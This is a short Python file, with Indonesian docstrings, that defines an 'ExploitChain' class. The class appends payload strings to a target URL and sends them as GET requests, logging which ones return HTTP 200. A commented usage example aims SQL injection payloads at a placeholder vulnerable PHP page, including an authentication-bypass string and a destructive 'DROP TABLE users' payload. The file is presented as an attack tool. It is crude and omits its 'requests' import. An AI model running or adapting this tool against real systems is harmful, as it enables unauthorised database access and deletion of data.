import logging

logger = logging.getLogger(__name__)

class ExploitChain:
    def __init__(self, target_url):
        self.target_url = target_url
        self.payloads = []

    def add_payload(self, payload):
        """
        Menambahkan payload ke dalam rantai eksploitasi.
        """
        self.payloads.append(payload)

    def execute(self):
        """
        Menjalankan rantai eksploitasi secara berurutan.
        """
        for payload in self.payloads:
            try:
                response = requests.get(self.target_url + payload)
                if response.status_code == 200:
                    logger.info(f"Payload executed successfully: {payload}")
                else:
                    logger.warning(f"Payload failed: {payload}")
            except Exception as e:
                logger.error(f"Error during exploit execution: {str(e)}")

# Contoh penggunaan:
# exploit_chain = ExploitChain("http://example.com/vulnerable-page.php?id=")
# exploit_chain.add_payload("' OR 1=1 --")
# exploit_chain.add_payload("; DROP TABLE users; --")
# exploit_chain.execute()
